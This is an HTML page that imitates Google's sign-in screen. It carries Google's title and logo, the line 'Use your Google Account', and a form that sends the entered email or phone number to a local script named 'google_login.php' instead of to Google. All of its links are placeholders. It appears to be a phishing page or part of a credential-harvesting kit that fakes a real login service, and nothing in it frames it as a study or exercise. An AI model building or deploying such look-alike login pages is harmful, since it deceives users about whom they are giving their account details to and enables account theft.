<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-[#f1f3f4]">

    <div class="flex items-center justify-center min-h-screen">
        <div class="w-full max-w-md p-8 bg-white rounded-lg shadow-md">
            <div class="flex flex-col items-center mb-8">
                <img src="/google.png" alt="Google Logo" class="w-12 h-12" />
                <h1 class="mt-4 text-2xl font-semibold">Sign in</h1>
                <p class="mt-2 text-sm text-gray-600">Use your Google Account</p>
            </div>
            <form action="google_login.php" method="POST">
                <div class="mb-4">
                    <label for="email" class="block mb-2 text-sm font-medium text-gray-700">
                        Email or phone
                    </label>
                    <input
                        class="flex h-10 border-input bg-background text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 w-full px-3 py-2 border rounded-md"
                        id="email"
                        type="text"
                        name="email"
                    />
                </div>
                <div class="mb-4 text-right">
                    <a href="#" class="text-sm text-blue-600" rel="ugc">
                        Forgot email?
                    </a>
                </div>
                <div class="mb-6 text-sm text-gray-600">
                    Not your computer? Use Guest mode to sign in privately. 
                    <a href="#" class="text-blue-600" rel="ugc">
                        Learn more
                    </a>
                </div>
                <div class="flex justify-between">
                    <a href="#" class="text-blue-600" rel="ugc">
                        Create account
                    </a>
                    <button class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-primary/90 h-10 px-6 py-2 text-white bg-blue-600 rounded-md">
                        Next
                    </button>
                </div>
            </form>
        </div>
        <div class="absolute bottom-0 left-0 right-0 flex justify-center p-4 text-sm text-gray-600">
            <div class="flex space-x-4">
                <a href="#" rel="ugc">
                    English (United States)
                </a>
                <a href="#" rel="ugc">
                    Help
                </a>
                <a href="#" rel="ugc">
                    Privacy
                </a>
                <a href="#" rel="ugc">
                    Terms
                </a>
            </div>
        </div>
    </div>

</body>
</html>
